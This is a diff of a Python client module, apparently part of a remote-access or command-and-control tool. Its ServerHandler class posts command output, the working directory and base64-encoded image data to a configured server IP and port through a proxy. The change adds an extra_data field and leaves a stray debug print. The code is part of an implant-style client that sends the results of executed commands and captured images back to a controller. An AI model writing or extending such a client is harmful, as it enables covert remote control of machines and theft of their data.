@@ -7,7 +7,6 @@ from requests import post, exceptions
 from client_settings import (SERVER_IP, SERVER_PORT, PROXY, HEADER,  CMD_RESPONSE,
                              RESPONSE_KEY)
 
-
 class ServerHandler():
 
     def __init__(self, ip, port):
@@ -17,7 +16,7 @@ class ServerHandler():
 
 
     # Post data to server
-    def post_to_server(self, message="", response_path=CMD_RESPONSE, image_data=None):
+    def post_to_server(self, message="", response_path=CMD_RESPONSE, image_data=None, extra_data=None):
         data = {
             RESPONSE_KEY: message,
             'cwd': os.getcwd()
@@ -25,9 +24,12 @@ class ServerHandler():
         if image_data:
             b64_str = base64.b64encode(image_data).decode()
             data['image'] = urllib.parse.quote(b64_str, safe='')
+        if extra_data:
+            print(data)
+            data.update(extra_data)
         try:
-            post(f"http://{SERVER_IP}:{SERVER_PORT}{response_path}", data=data,
-                 headers=HEADER, proxies=PROXY)
+            post(f"http://{SERVER_IP}:{SERVER_PORT}{response_path}",
+                 data=data, headers=HEADER, proxies=PROXY)
         except exceptions.RequestException:
             return
 
@@ -63,4 +65,3 @@ class ServerHandler():
             self.post_to_server(output, response_path=CMD_RESPONSE)
         except Exception as e:
             self.post_to_server(f"Error: {e}\n", response_path=CMD_RESPONSE)
-
